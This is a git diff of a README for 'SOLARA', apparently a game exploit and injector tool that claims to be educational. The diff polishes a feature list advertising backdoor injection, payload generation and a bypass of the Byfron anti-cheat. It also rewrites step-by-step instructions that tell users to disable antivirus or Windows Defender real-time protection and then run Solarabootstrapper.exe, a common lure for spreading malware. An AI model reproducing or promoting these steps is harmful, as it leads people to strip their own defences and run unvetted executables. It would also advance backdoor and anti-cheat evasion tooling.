@@ -11,19 +11,19 @@
 
 SOLARA is for educational purposes only, intended to help server owners develop a "hacker defense" attitude. This tool comes without any warranty.
 
- ## Features !
- - bug fixes.
-- improved bootstrapper.
-- improved backdoor injection.
-- Generate payloads in Various formats.
-- Bypass byfron.
-- new gui.
-- The ability to search updated scripts.
-- Automatically runs injector (in settings).
+## Features!
+- Bug fixes.
+- Improved bootstrapper.
+- Enhanced backdoor injection.
+- Generate payloads in various formats.
+- Bypassed Byfron.
+- New GUI.
+- Ability to search for updated scripts.
+- Automatically runs injector (configurable in settings).
 
 ## HOW TO RUN ON WINDOWS
 
-first download the zip and then turn off your anti-virus or your real-time protection in windows defender.
+First, download the zip file. Next, temporarily disable your antivirus software or the real-time protection feature in Windows Defender to avoid any potential interference.
 
 how to download solara zip file:
 
@@ -36,7 +36,7 @@ how to disable antivirus in windows defender:
 ```
                windows defender > virus and threat protection > manage settings > disable real-time protection.
 ```
-after doing that
+After that, unzip the file using WinRAR or 7-Zip. Once extracted, navigate to the files and double-click on Solarabootstrapper.exe. With this, the process is complete.
 
 Take a look at the source code for more details.
 
